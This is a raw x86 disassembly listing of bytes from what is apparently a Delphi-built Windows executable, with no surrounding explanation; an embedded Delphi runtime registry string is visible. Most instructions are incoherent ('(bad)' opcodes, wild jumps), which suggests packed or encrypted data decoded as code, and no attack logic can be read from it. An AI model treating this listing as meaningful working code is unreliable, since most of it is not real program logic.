  402002:	inc    eax
  402003:	jmp    0x401fa1
  402005:	mov    edi,0x74550f1c
  40200a:	fild   QWORD PTR [edi-0x26]
  40200d:	pop    ecx
  40200e:	mov    ebx,0x3726182
  402013:	xchg   edx,eax
  402014:	and    BYTE PTR [ecx+0x110e0b76],bl
  40201a:	add    eax,0x3680d077
  40201f:	ret    
  402020:	or     bl,dh
  402022:	ret    
  402023:	or     ch,BYTE PTR [esi-0x54fb6337]
  402029:	aad    0x75
  40202b:	add    bh,BYTE PTR [eax+0x2a]
  40202e:	pop    esi
  40202f:	fistp  WORD PTR [eax-0x7609cea7]
  402035:	xor    bh,BYTE PTR [edx-0x1e7e09]
  40203b:	sub    BYTE PTR [edi],ch
  40203d:	pushf  
  40203e:	jge    0x402056
  402040:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402042:	sub    BYTE PTR [edi],ah
  402044:	jbe    0x402063
  402046:	inc    eax
  402047:	jmp    0x7c04:0xc8102f19
  40204e:	dec    ebp
  40204f:	je     0xe03f5d91
  402055:	lods   al,BYTE PTR ds:[esi]
  402056:	test   ah,dh
  402058:	bound  ecx,QWORD PTR [ebp-0x7c3d767f]
  40205e:	loop   0x40207f
  402060:	lea    edx,[edx+edx*4]
  402063:	fld    TBYTE PTR [ebx+edx*2-0x44c6d209]
  40206a:	jnp    0x4020d7
  40206c:	pop    esp
  40206d:	faddp  st(4),st
  40206f:	call   0x2bb99479
  402074:	pcmpeqb mm1,QWORD PTR [edi+ebp*1]
  402078:	sub    eax,0xdb2ed2f
  40207d:	push   ds
  40207e:	add    al,0x74
  402080:	popa   
  402081:	scas   al,BYTE PTR es:[edi]
  402082:	and    BYTE PTR [ebx-0x3d],al
  402085:	jmp    0x4020e7
  402087:	fcom   DWORD PTR [edx-0x6e812f36]
  40208d:	jge    0x4020d5
  40208f:	mov    ecx,edi
  402091:	xor    al,0xfb
  402093:	pop    edi
  402094:	push   edx
  402095:	cdq    
  402096:	stc    
  402097:	sbb    al,0xf9
  402099:	jmp    0x4020a9
  40209b:	fstp   st(0)
  40209d:	fld    TBYTE PTR [ebx+0x104068ed]
  4020a3:	ins    BYTE PTR es:[edi],dx
  4020a4:	xchg   BYTE PTR [eax-0x711126ee],cl
  4020aa:	daa    
  4020ab:	mov    DWORD PTR [eax+ebx*4],0x137a80a7
  4020b2:	aas    
  4020b3:	mov    al,ds:0xc9e41c9f
  4020b8:	add    al,BYTE PTR [eax-0x38]
  4020bb:	add    eax,0x9c4008fa
  4020c0:	or     al,0x3e
  4020c2:	repnz leave 
  4020c4:	daa    
  4020c5:	push   eax
  4020c6:	ret    
  4020c7:	mov    esp,tr6
  4020ca:	adc    al,BYTE PTR [eax+0x1f169896]
  4020d0:	stc    
  4020d1:	enter  0x2047,0xbc
  4020d5:	mov    esi,0xee6b2819
  4020da:	sbb    al,0xf9
  4020dc:	add    dl,BYTE PTR [ebp-0x1a0e04e0]
  4020e2:	das    
  4020e3:	inc    eax
  4020e4:	mov    bh,0x43
  4020e6:	mov    edx,0xd4a51023
  4020eb:	call   0xafdd:0xf9269d5e
  4020f2:	jl     0x40211e
  4020f4:	out    0x84,eax
  4020f6:	xchg   ecx,eax
  4020f7:	sub    al,BYTE PTR [eax-0x4a19df0c]
  4020fd:	sub    eax,0xa931a013
  402102:	pop    edi
  402103:	jecxz  0x402135
  402105:	(bad)  
  402106:	stc    
  402107:	xchg   ebp,eax
  402108:	pop    edi
  402109:	add    al,0xbf
  40210b:	leave  
  40210c:	sbb    ecx,DWORD PTR [esi-0x43d13acc]
  402112:	mov    ds:0x764037b1,al
  402117:	cmp    ch,BYTE PTR [ebx+0xb]
  40211a:	ficomp WORD PTR [ebx+0x3a9ff9ff]
  402120:	call   0xc76325ae
  402125:	mov    bh,BYTE PTR [esi]
  402127:	bound  ebp,QWORD PTR [ebp+eax*8+0x41ad78eb]
  40212e:	cmp    BYTE PTR [edx-0x1],0xe6
  402132:	(bad)  
  402134:	pop    ss
  402135:	mov    bh,0x26
  402137:	xlat   BYTE PTR ds:[ebx]
  402138:	fadd   DWORD PTR [eax+edx*4-0x54]
  40213c:	outs   dx,BYTE PTR ds:[esi]
  40213d:	xor    bh,BYTE PTR [eax-0x7a]
  402140:	xchg   DWORD PTR [eax-0x4c],ecx
  402143:	push   edi
  402144:	or     bh,BYTE PTR [edi]
  402146:	push   ss
  402147:	push   0xffff4ba9
  40214c:	push   DWORD PTR [edi]
  40214e:	mov    eax,ds:0x1bcecced
  402153:	ret    0x4ed3
  402156:	inc    eax
  402157:	mov    al,ds:0x61401484
  40215c:	push   ecx
  40215d:	pop    ecx
  40215e:	test   BYTE PTR [edx+0x40],dl
  402161:	enter  0x19a5,0x90
  402165:	mov    ecx,0xffa56fa5
  40216a:	(bad)  
  40216b:	(bad)  
  40216c:	call   DWORD PTR [ebp+0x40]
  40216f:	cmp    cl,BYTE PTR [edi]
  402171:	and    ah,dh
  402173:	daa    
  402174:	(bad)  
  402175:	retf   
  402176:	into   
  402177:	pop    eax
  402178:	inc    eax
  402179:	test   BYTE PTR [ecx],cl
  40217b:	xchg   esp,eax
  40217c:	clc    
  40217d:	js     0x4021b8
  40217f:	aas    
  402180:	sbb    DWORD PTR [eax+eax*2-0x1b],0xd736b90b
  402188:	pop    es
  402189:	(bad)  
  40218a:	mov    eax,ds:0xffff405f
  40218f:	(bad)  
  402190:	(bad)  
  402191:	fisttp WORD PTR [esi+0x67]
  402194:	add    al,0xcd
  402196:	leave  
  402197:	repnz leave 
  402199:	bound  eax,QWORD PTR [eax-0x6a]
  40219c:	and    al,BYTE PTR [ecx+0x6f7c4045]
  4021a2:	cld    
  4021a3:	gs inc eax
  4021a5:	sahf   
  4021a6:	mov    ch,0x70
  4021a8:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  4021ae:	inc    eax
  4021af:	aad    0xa6
  4021b1:	(bad)  
  4021b2:	(bad)  
  4021b3:	jg     0x4021b0
  4021b5:	iret   
  4021b6:	dec    DWORD PTR [ecx+0x1f]
  4021b9:	js     0x40216f
  4021bb:	inc    eax
  4021bc:	mov    ds:0x16c59b14,eax
  4021c1:	stos   DWORD PTR es:[edi],eax
  4021c2:	mov    bl,0xef
  4021c4:	cmp    eax,0xe98ce041
  4021c9:	or     cl,0x47
  4021cc:	mov    edx,0xaa41a893
  4021d1:	pop    ss
  4021d2:	clc    
  4021d3:	(bad)  
  4021d4:	(bad)  
  4021d5:	jmp    esi
  4021d7:	jg     0x402204
  4021d9:	mov    eax,ds:0x4212b616
  4021de:	imul   edx,DWORD PTR [ebp+0x27],0x39
  4021e2:	(bad)  
  4021e3:	div    DWORD PTR [eax-0x20]
  4021e6:	jl     0x40222a
  4021e8:	xor    cl,cl
  4021ea:	cmp    al,0xe3
  4021ec:	call   DWORD PTR [esi+0x42e78a52]
  4021f2:	mov    ?,edi
  4021f4:	(bad)  
  4021f5:	jmp    FWORD PTR [edi-0x140462b8]
  4021fb:	jle    0x4021a7
  4021fd:	push   ecx
  4021fe:	inc    ebx
  4021ff:	mov    WORD PTR [edi],gs
  402201:	push   0x5c
  402203:	sbb    esp,edi
  402205:	sar    BYTE PTR es:[ebx-0x331c89bd],cl
  40220c:	repnz sub DWORD PTR [edi],ebp
  40220f:	test   BYTE PTR [ecx-0x2dbbda],al
  402215:	(bad)  
  402216:	(bad)  
  402217:	dec    DWORD PTR [edx]
  402219:	nop
  40221a:	fild   DWORD PTR [eax]
  40221c:	daa    
  40221d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40221e:	lahf   
  40221f:	nop
  402220:	inc    esp
  402221:	pop    ss
  402222:	stos   BYTE PTR es:[edi],al
  402223:	clc    
  402224:	scas   al,BYTE PTR es:[edi]
  402225:	adc    bl,ah
  402227:	(bad)
  40222a:	inc    esp
  40222b:	pop    ecx
  40222c:	pushf  
  40222d:	mov    al,0xe9
  40222f:	pop    es
  402230:	pushf  
  402231:	mov    dh,dl
  402233:	fs inc ebp
  402235:	aam    0xf3
  402237:	idiv   edi
  402239:	(bad)  
  40223a:	(bad)  
  40223b:	(bad)  
  40223c:	jmp    0x40221f
  40223e:	dec    edx
  40223f:	jp     0x4021d6
  402241:	iret   
  402242:	inc    ebp
  402243:	bound  esp,QWORD PTR [edx-0x2723f86b]
  402249:	ds mov eax,0x91c74639
  40224f:	push   cs
  402250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402251:	scas   al,BYTE PTR es:[edi]
  402252:	mov    al,ds:0x46a3e319
  402257:	pop    ss
  402258:	or     al,0x75
  40225a:	add    DWORD PTR [esi-0x1],0x48c97675
  402264:	dec    ebp
  402265:	in     al,0xa7
  402267:	xchg   ebx,eax
  402268:	cmp    DWORD PTR [ebx],edi
  40226a:	xor    eax,0x53edb2b8
  40226f:	in     eax,0x5d
  402271:	cmp    eax,0x8b3b5dc5
  402276:	sahf   
  402277:	xchg   edx,eax
  402278:	pop    edx
  402279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40227a:	lock mov eax,ds:0xa554c020
  402280:	(bad)  
  402281:	(bad)  
  402282:	out    dx,eax
  402283:	cli    
  402284:	mov    WORD PTR [edi],?
  402286:	popa   
  402287:	mov    ebx,DWORD PTR [edx+0x44]
  40228a:	and    eax,0xdbf9895d
  40228f:	addr16 clc 
  402291:	repz daa 
  402293:	mov    edi,0xdd5dc8a2
  402298:	sub    BYTE PTR [esi-0x65],0x97
  40229c:	and    BYTE PTR [edx-0xa27c],cl
  4022a2:	add    dl,BYTE PTR [edx+0x60]
  4022a5:	les    esp,FWORD PTR ds:0xd559f075
  4022ab:	outs   dx,BYTE PTR ds:[esi]
  4022ac:	bound  edx,QWORD PTR [ecx]
  4022ae:	xor    eax,0x3c7bcaae
  4022b3:	and    eax,0xb8006f90
  4022b8:	push   ds
  4022b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022ba:	idiv   cl
  4022bc:	and    BYTE PTR [ebx+eax*4],ah
  4022bf:	clc    
  4022c0:	add    esi,DWORD PTR [edx+edi*8]
  4022c3:	sti    
  4022c4:	pop    es
  4022c5:	jne    0x4022e3
  4022c7:	push   0x1
  4022c9:	pop    ss
  4022ca:	and    eax,0xdf3ff00
  4022cf:	mov    eax,0xa464ca18
  4022d4:	pop    es
  4022d5:	add    DWORD PTR [eax+ebp*4-0x55],edi
  4022d9:	mov    bh,0xfe
  4022db:	push   ebp
  4022dc:	das    
  4022dd:	hlt    
  4022de:	movzx  eax,WORD PTR ds:0x8dbd5020
  4022e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e6:	cs ss jae 0x4022ec
  4022ea:	push   0xc8f86884
  4022ef:	push   0xbe68009a
  4022f4:	adc    BYTE PTR [edx+0x76d4d1c],0x7c
  4022fb:	bnd jbe 0x4022cf
  4022fe:	xor    bh,al
  402300:	inc    ebp
  402301:	hlt    
  402302:	hlt    
  402303:	pop    esi
  402304:	hlt    
  402305:	push   eax
  402306:	ret    
  402307:	lods   eax,DWORD PTR ds:[esi]
  402308:	lahf   
  402309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40230a:	data16 clc 
  40230c:	add    BYTE PTR [ecx+esi*1],dl
  40230f:	inc    eax
  402310:	test   DWORD PTR [esp+eax*4],esp
  402313:	imul   eax,DWORD PTR [edi+0x30d8b309],0x5c2142b
  40231d:	jo     0x4022ee
  40231f:	lahf   
  402320:	out    dx,eax
  402321:	mov    ax,ds:0xffc0d6e1
  402327:	data16 daa 
  402329:	fsubr  QWORD PTR [edi-0x56]
  40232c:	xor    al,0x66
  40232e:	pop    edx
  40232f:	aas    
  402330:	or     ax,dx
  402333:	mov    ds:0xffff6829,ax
  402339:	jmp    DWORD PTR [esi]
  40233b:	adc    dl,BYTE PTR [ebx+0x4f]
  40233e:	inc    esi
  40233f:	push   esp
  402340:	push   edi
  402341:	inc    ecx
  402342:	push   edx
  402343:	inc    ebp
  402344:	pop    esp
  402345:	inc    edx
  402346:	outs   dx,DWORD PTR ds:[esi]
  402347:	jb     0x4023b5
  402349:	popa   
  40234a:	outs   dx,BYTE PTR ds:[esi]
  40234b:	fs pop esp
  40234d:	inc    esp
  40234e:	gs ins BYTE PTR es:[edi],dx
  402350:	jo     0x4023ba
  402352:	imul   ebx,DWORD PTR [esi+ebp*8+0x2b],0x5452ffff
  40235a:	dec    esp
  40235b:	add    BYTE PTR [esi+0x50],al
  40235e:	push   ebp
  40235f:	dec    ebp
  402360:	popa   
  402361:	jae    0x4023ce
  402363:	push   esi
  402364:	popa   
  402365:	ins    BYTE PTR es:[edi],dx
  402366:	jne    0x4023cd
  402368:	fninit 
  40236a:	fldcw  WORD PTR ds:0x41827873
  402371:	push   edi
  402372:	(bad)  
  402373:	push   ecx
  402374:	dec    esp
  402375:	cmc    
  402376:	notrack lock jmp DWORD PTR ds:0x8bd726b6
  40237e:	jo     0x402354
  402380:	xor    ecx,ecx
  402382:	mov    cl,BYTE PTR [esi]
  402384:	inc    ecx
  402385:	add    eax,DWORD PTR [edi+esi*8]
  402388:	add    BYTE PTR [edi],cl
  40238a:	adc    BYTE PTR [eax-0x24],al
  40238d:	lock add cl,BYTE PTR [ebx+0x5b71db57]
  402394:	inc    eax
  402395:	inc    esi
  402396:	cmp    DWORD PTR [ecx],esp
  402398:	mov    BYTE PTR [eax],cl
  40239a:	(bad)  
  40239b:	mov    edx,eax
  40239d:	sbb    eax,DWORD PTR [edi-0x3]
  4023a0:	pop    esi
  4023a1:	cmp    ecx,esp
  4023a3:	pop    ebx
  4023a4:	aaa    
  4023a5:	and    ah,BYTE PTR [ecx*1-0x10f93fe7]
  4023ac:	adc    ebp,eax
  4023ae:	ffreep st(0)
  4023b0:	fsubr  DWORD PTR [edi-0x7c]
  4023b3:	shl    BYTE PTR [eax+ecx*1+0x50],cl
  4023b7:	sub    al,0x24
  4023b9:	adc    al,0x16
  4023bb:	xorps  xmm1,XMMWORD PTR [eax]
  4023be:	xor    DWORD PTR [edi+0x11],0x6c
  4023c2:	pop    DWORD PTR fs:0x31c3e017
  4023c9:	ret    
  4023ca:	addr16 xchg ebp,eax
  4023cc:	dec    ebp
  4023cd:	jl     0x40244d
  4023cf:	add    eax,0x7e06e64
  4023d4:	mov    dl,0xdc
  4023d6:	clc    
  4023d7:	add    BYTE PTR [edi],0x7c
  4023da:	or     bh,bh
  4023dc:	push   ecx
  4023dd:	cld    
  4023de:	ret    
  4023df:	test   bl,0x2c
  4023e2:	stos   DWORD PTR es:[edi],eax
  4023e3:	mov    ecx,DWORD PTR [ebx-0x28]
  4023e6:	xor    edx,ebx
  4023e8:	pop    ebx
  4023e9:	loopne 0x40241a
  4023eb:	pop    eax
  4023ec:	shr    ecx,0x2
  4023ef:	dec    ecx
  4023f0:	rep stos DWORD PTR es:[edi],eax
  4023f2:	pop    ecx
  4023f3:	xor    DWORD PTR [ecx+0x2ae289d0],ecx
  4023f9:	mov    eax,0x17416077
  4023fe:	adc    al,0x1
  402400:	mov    BYTE PTR [ebx-0x24],bl
  402403:	je     0x402409
  402405:	mov    ebx,DWORD PTR [ebx]
  402407:	pop    edi
  402408:	sub    ebp,0x39edebff
  40240e:	aam    0x74
  402410:	sbb    eax,0x830b8b5b
  402415:	ret    
  402416:	sbb    dh,BYTE PTR [ebx+0x10]
  402419:	inc    BYTE PTR [esi]
  40241b:	mov    edi,DWORD PTR [ebx+0x14]
  40241e:	mov    DWORD PTR [ebp+0x4],ebp
  402421:	mov    esi,0x1e0734db
  402426:	sbb    al,0x49
  402428:	jne    0x402462
  40242a:	jne    0x40240f
  40242c:	aaa    
  40242d:	(bad)  
  40242e:	adc    al,0xd8
  402430:	jmp    FWORD PTR [esi+eax*8+0x568b368b]
  402437:	ror    BYTE PTR [ebx+0x72a7876],0x35
  40243e:	cmp    BYTE PTR [ecx+0x5fc1f7d8],cl
  402444:	pop    es
  402445:	jp     0x402430
  402447:	inc    edx
  402448:	xchg   ecx,edx
  40244a:	cmp    ecx,0x1173ff3c
  402450:	lsl    ebp,WORD PTR [esi]
  402453:	test   al,0xfa
  402455:	(bad)  
  402456:	jb     0x40245f
  402458:	movd   DWORD PTR [ebx],mm0
  40245b:	and    al,0x21
  40245d:	jmp    ecx
  40245f:	push   0x40b0585
  402464:	and    BYTE PTR [ecx],al
  402466:	rol    DWORD PTR [eax],0x8b
  402469:	adc    DWORD PTR [ecx+0x25],esi
  40246c:	sbb    al,0x2e
  40246e:	dec    eax
  40246f:	sbb    al,0x4f
  402471:	pop    edi
  402472:	push   edi
  402473:	ror    DWORD PTR [eax],1
  402475:	cmp    al,0xc8
  402477:	sahf   
  402478:	jp     0x402453
  40247a:	loop   0x40246c
  40247c:	mov    cl,0x2
  40247e:	sub    ah,0x1
  402481:	push   es
  402482:	xor    eax,DWORD PTR [eax+0x392bc01d]
  402488:	cmp    BYTE PTR [esi+0x4a971423],ah
  40248e:	js     0x4024aa
  402490:	int3   
  402491:	cmp    ah,al
  402493:	adc    al,0x14
  402495:	lods   al,BYTE PTR ds:[esi]
  402496:	inc    eax
  402497:	cmp    BYTE PTR [eax+0x1389d634],bh
  40249d:	adc    ah,BYTE PTR [edx+ebp*2]
  4024a0:	mov    esi,edx
  4024a2:	lea    esi,[eax+0x1a44b17b]
  4024a8:	lea    ecx,[ebp-0x8]
  4024ab:	inc    ecx
  4024ac:	push   eax
  4024ad:	sbb    BYTE PTR [ecx+0xf602722],cl
  4024b3:	mov    eax,DWORD PTR [esp+esi*8-0x43]
  4024b7:	out    0x20,al
  4024b9:	jecxz  0x402449
  4024bb:	mov    ds:0x74950f60,eax
  4024c0:	fsubr  DWORD PTR [ebx+0xd]
  4024c3:	shr    BYTE PTR [edi+ebx*4],1
  4024c6:	adc    bl,ch
  4024c8:	mov    al,0x39
  4024ca:	add    al,0x9
  4024cc:	lock mov eax,ebx
  4024cf:	pop    edi
  4024d0:	push   0x18
  4024d2:	ficom  WORD PTR [ebx]
  4024d4:	fisttp WORD PTR [ebx+0x29d0b843]
  4024da:	mov    al,0x3c
  4024dc:	dec    ebp
  4024dd:	sti    
  4024de:	stos   DWORD PTR es:[edi],eax
  4024df:	icebp  
  4024e0:	mov    esi,DWORD PTR [edx]
  4024e2:	cmp    esi,DWORD PTR [eax]
  4024e4:	mov    ah,0x72
  4024e6:	add    al,0x3b
  4024e8:	jo     0x4024ee
  4024ea:	jne    0x4024fc
  4024ec:	push   cs
  4024ed:	or     BYTE PTR [eax],cl
  4024ef:	rcl    DWORD PTR [esi],0x3
  4024f2:	int    0x75
  4024f4:	or     BYTE PTR [edx+ebp*2],cl
  4024f7:	je     0x40250c
  4024f9:	inc    eax
  4024fa:	test   BYTE PTR [ecx],bl
  4024fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024fd:	loope  0x402559
  4024ff:	fsubr  QWORD PTR [ebx+0x6290f6c5]
  402505:	xor    al,0xe2
  402507:	gs aaa 
  402509:	and    al,0xd
  40250b:	add    ebx,DWORD PTR es:[eax]
  40250e:	pop    es
  40250f:	ds and eax,0x78c423cc
  402515:	ss mov al,0x1
  402518:	scas   eax,DWORD PTR es:[edi]
  402519:	push   ebx
  40251a:	mov    bh,0x3e
  40251c:	cld    
  40251d:	push   edi
  40251e:	xchg   esi,eax
  40251f:	jmp    0x402523
  402521:	stos   BYTE PTR es:[edi],al
  402522:	jle    0x4024f4
  402524:	or     BYTE PTR ds:0xf0e87f4c,0x7f
  40252b:	sqrtps xmm0,XMMWORD PTR [ebx+0x66f202c7]
  402532:	scas   eax,DWORD PTR es:[edi]
  402533:	je     0x40253f
  402535:	pop    ecx
  402536:	int    0xf6
  402538:	cld    
  402539:	ret    
  40253a:	pop    eax
  40253b:	add    eax,eax
  40253d:	fmul   QWORD PTR [ebp-0x37d601f2]
  402543:	mov    esi,DWORD PTR [edi+eax*2-0x4]
  402547:	pop    edi
  402548:	cs push eax
  40254a:	add    BYTE PTR [ebx-0xea7a684],dl
  402550:	mov    ebx,0xffca7707
  402555:	out    0x59,al
  402557:	jb     0x402574
  402559:	push   0x39008a2e
  40255e:	rol    BYTE PTR [edi+0x6ec3fb8e],1
  402564:	push   DWORD PTR [ebp-0xd]
  402567:	mov    esi,0xb8ecb82e
  40256c:	imul   ebx,DWORD PTR [eax-0x30c97f45],0x321c5607
  402576:	or     WORD PTR [esi+0x51],dx
  40257a:	and    al,0xac
  40257c:	int3   
  40257d:	pop    ss
  40257e:	pop    sp
  402580:	shl    dl,0x50
  402583:	popf   
  402584:	aas    
  402585:	sub    dl,BYTE PTR [esi]
  402587:	jecxz  0x4025e1
  402589:	fdiv   st,st(1)
  40258b:	pop    esi
  40258c:	pop    eax
  40258d:	pop    esi
  40258e:	mov    WORD PTR [ecx-0x10],fs
  402591:	ror    BYTE PTR ds:0x52766e3b,0x51
  402598:	push   ebx
  402599:	ret    0x37c
  40259c:	stos   BYTE PTR es:[edi],al
  40259d:	hlt    
  40259e:	xor    edx,edx
  4025a0:	push   edi
  4025a1:	loopne 0x4025a2
  4025a3:	xchg   edi,eax
  4025a4:	add    BYTE PTR [ebx+ecx*4+0x1a],ah
  4025a8:	mov    DWORD PTR [ecx],ebx
  4025aa:	mov    DWORD PTR [ecx+0x8],ebp
  4025ad:	mov    DWORD PTR [ecx+0x4],0x41892841
  4025b4:	or     al,0xc6
  4025b6:	push   cs
  4025b7:	or     eax,0x560a880d
  4025bc:	pop    edx
  4025bd:	jne    0x4025e4
  4025bf:	jl     0x40258e
  4025c1:	sbb    DWORD PTR [ebx],0xffffffa8
  4025c4:	test   BYTE PTR [esi+ecx*4],ch
  4025c7:	pop    edx
  4025c8:	push   cs
  4025c9:	mov    dl,0xfa
  4025cb:	rcl    cl,1
  4025cd:	rol    DWORD PTR [ecx+0x39581250],1
  4025d3:	xchg   esi,eax
  4025d4:	or     BYTE PTR [edi+0x17],dl
  4025d7:	mov    ds:0xff102f7f,al
  4025dc:	push   edx
  4025dd:	clc    
  4025de:	out    dx,eax
  4025df:	sbb    esp,esp
  4025e1:	cmp    al,0xbb
  4025e3:	push   ebx
  4025e4:	loop   0x402589
  4025e6:	xlat   BYTE PTR ds:[ebx]
  4025e7:	jg     0x4025ea
  4025e9:	fsub   DWORD PTR [ebx]
  4025eb:	call   0x602e7e4a
  4025f0:	pop    ecx
  4025f1:	std    
  4025f2:	je     0x402574
  4025f4:	cmp    eax,0x7601d024
  4025f9:	adc    ecx,esp
  4025fb:	in     al,0xdf
  4025fd:	cli    
  4025fe:	in     eax,dx
  4025ff:	sti    
  402600:	mov    ch,0x9
  402602:	icebp  
  402603:	push   cs
  402604:	call   DWORD PTR ds:0xc4371014
  40260a:	pop    ss
  40260b:	push   eax
  40260c:	pusha  
  40260d:	outs   dx,BYTE PTR ds:[esi]
  40260e:	(bad)  
  40260f:	nop
  402610:	ja     0x402666
  402612:	push   0x2
  402614:	cmp    ah,ah
  402616:	cwde   
  402617:	or     BYTE PTR [eax-0x31],bl
  40261a:	ins    BYTE PTR es:[edi],dx
  40261b:	mov    ecx,0x12e69e4
  402620:	loopne 0x402626
  402622:	scas   eax,DWORD PTR es:[edi]
  402623:	jmp    esp
  402625:	push   ds
  402626:	cmp    al,0x7
  402628:	push   eax
  402629:	push   ebx
  40262a:	bound  esp,QWORD PTR [esp+ecx*8]
  40262d:	daa    
  40262e:	adc    al,0x19
  402630:	mov    eax,DWORD PTR [ecx+0x1]
  402633:	and    BYTE PTR [eax],0xfa
  402636:	push   esi
  402638:	cmp    ecx,ebp
  40263a:	je     0x402648
  40263c:	or     bl,ch
  40263e:	jne    0x40264c
  402640:	movsx  eax,al
  402643:	inc    ecx
  402644:	inc    ecx
  402645:	jmp    0x40264a
  402647:	add    ecx,0x5
  40264a:	pop    edx
  40264b:	(bad)  [edi+0x67366c31]
  402651:	sbb    eax,0x51f82419
  402656:	mov    ebx,0x90c70207
  40265b:	loope  0x4026b3
  40265d:	adc    dl,BYTE PTR [bp+si+0x61]
  402661:	add    DWORD PTR [ebx+0x66],0x3f
  402665:	loop   0x4026c1
  402667:	mov    ah,0x3b
  402669:	inc    eax
  40266a:	aaa    
  40266b:	ins    DWORD PTR es:[edi],dx
  40266c:	adc    BYTE PTR [eax],0x65
  40266f:	jecxz  0x4026aa
  402671:	pop    eax
  402672:	mov    ch,0xf8
  402675:	or     eax,edi
  402677:	clc    
  402678:	test   DWORD PTR [eax+0x4],0x13850f0c
  40267f:	xor    al,0x81
  402681:	fsubp  st(3),st
  402683:	sbb    ebx,ebp
  402685:	cmp    dh,bl
  402687:	inc    edx
  402688:	test   DWORD PTR [eax+0x14],ecx
  40268b:	je     0x4026fb
  40268d:	cld    
  40268e:	popa   
  40268f:	and    BYTE PTR [ebx+0x74331015],cl
  402695:	mov    edx,0xfd45ee8
  40269a:	test   cl,dh
  40269c:	(bad)  
  40269d:	ror    dh,cl
  40269f:	adc    ah,BYTE PTR [ebp-0x18b1f990]
  4026a5:	sub    dl,ah
  4026a7:	dec    edx
  4026a8:	inc    ebx
  4026a9:	cmp    edi,0xffffff81
  4026ac:	cmp    esi,ecx
  4026ae:	cli    
  4026af:	out    dx,eax
  4026b0:	push   cs
  4026b1:	je     0x4026ea
  4026b3:	dec    ecx
  4026b4:	test   al,0x4a
  4026b6:	sub    al,ah
  4026b8:	inc    eax
  4026b9:	js     0x40267e
  4026bb:	jbe    0x4026e6
  4026bd:	pop    ebp
  4026be:	ja     0x4026e0
  4026c0:	out    0x50,al
  4026c2:	cmp    DWORD PTR [ebx-0x4c],eax
  4026c5:	fild   WORD PTR [ebx-0x77c8bff]
  4026cb:	add    BYTE PTR [eax+0x76],bl
  4026ce:	stos   DWORD PTR es:[edi],eax
  4026cf:	cmp    ebp,esi
  4026d1:	cmp    DWORD PTR [ebx+ebx*1],0xffffffbb
  4026d5:	enter  0xeb0c,0x30
  4026d9:	adc    eax,0x1e760175
  4026de:	adc    eax,0xd0a05610
  4026e3:	push   eax
  4026e4:	(bad)  
  4026e5:	aam    0xfa
  4026e7:	push   eax
  4026e8:	jns    0x40271a
  4026ea:	dec    ecx
  4026eb:	mov    BYTE PTR [edi-0x22],bh
  4026ee:	je     0x402760
  4026f0:	or     DWORD PTR [eax+0x4],0x2
  4026f4:	out    0xea,al
  4026f6:	das    
  4026f7:	cmp    BYTE PTR [eax],bh
  4026f9:	in     al,dx
  4026fa:	sub    bl,BYTE PTR [ebx]
  4026fc:	push   ebx
  4026fd:	cmp    BYTE PTR [esi],cl
  4026ff:	sub    BYTE PTR [eax+edx*2-0x2ac9a798],dh
  402706:	cmp    BYTE PTR ds:0xb852a80d,al
  40270c:	sbb    BYTE PTR [esi],dl
  40270e:	sub    BYTE PTR [eax-0x29],ch
  402711:	fstp   QWORD PTR [ecx]
  402713:	xchg   edi,edi
  402715:	mov    al,0x0
  402717:	(bad)  [eax+0x1f6f8b0b]
  40271d:	shl    BYTE PTR [ebp-0x41],0x3e
  402721:	pop    edi
  402722:	add    al,0xc7
  402724:	inc    edi
  402725:	add    al,0x84
  402727:	push   eax
  402728:	ret    0xe47f
  40272b:	(bad)  
  40272c:	sti    
  40272d:	sti    
  40272e:	mov    WORD PTR [edi-0x7708041d],fs
  402734:	dec    ebp
  402735:	adc    DWORD PTR [ecx+0x586d0f90],ecx
  40273b:	jecxz  0x402734
  40273d:	inc    ecx
  40273e:	or     BYTE PTR [ecx+eiz*1],dh
  402741:	sar    BYTE PTR [eax-0x48ca89e],0xd
  402748:	and    ebx,DWORD PTR [esi]
  40274a:	pop    edi
  40274b:	je     0x40276c
  40274d:	mov    ecx,DWORD PTR [edx-0x68]
  402750:	inc    edx
  402751:	add    al,0xdc
  402753:	mov    bh,0x10
  402755:	jmp    0x728c2bff
  40275a:	mov    es,WORD PTR [edx]
  40275c:	test   DWORD PTR ds:0xff1825f4,edi
  402762:	shr    DWORD PTR [edx],1
  402764:	outs   dx,DWORD PTR ds:[esi]
  402765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402766:	(bad)  
  402767:	push   DWORD PTR [ebx+eiz*8]
  40276a:	or     bh,BYTE PTR [eax+0x5ae8d8d8]
  402770:	push   esp
  402771:	push   ebp
  402772:	push   edi
  402773:	push   esi
  402774:	push   ebx
  402775:	or     DWORD PTR [edx],0x1c
  402778:	xchg   esp,eax
  402779:	inc    edx
  40277a:	pop    es
  40277b:	fldenv es:[ebp+eiz*1-0x20]
  402780:	inc    edx
  402781:	sti    
  402782:	sar    DWORD PTR ds:[esi+0x57b6c730],0xd4
  40278a:	clc    
  40278b:	adc    edi,DWORD PTR [esp+ecx*2-0x76f56fe5]
  402792:	sub    eax,DWORD PTR [edx+0xc]
  402795:	and    DWORD PTR [eax+0x4],0xfffffffd
  402799:	add    al,0x27
  40279b:	pop    ebp
  40279c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40279d:	aas    
  40279e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40279f:	inc    edx
  4027a0:	add    al,0x38
  4027a2:	sbb    edi,DWORD PTR [edx]
  4027a4:	push   esp
  4027a5:	or     eax,0xcedc8c87
  4027aa:	adc    al,0x18
  4027ac:	adc    BYTE PTR [ecx-0x7e],bl
  4027af:	dec    ebp
  4027b0:	pop    ebx
  4027b1:	add    bh,BYTE PTR [eax+0x34918df5]
  4027b7:	cmp    cl,0xd9
  4027ba:	jae    0x402816
  4027bc:	mov    esp,DWORD PTR [esp+0x2c]
  4027c0:	sbb    bh,BYTE PTR [ebp+eax*4+0x5d74506f]
  4027c7:	ins    DWORD PTR es:[edi],dx
  4027c8:	inc    eax
  4027c9:	jmp    edx
  4027cb:	ret    
  4027cc:	xor    ebp,ebx
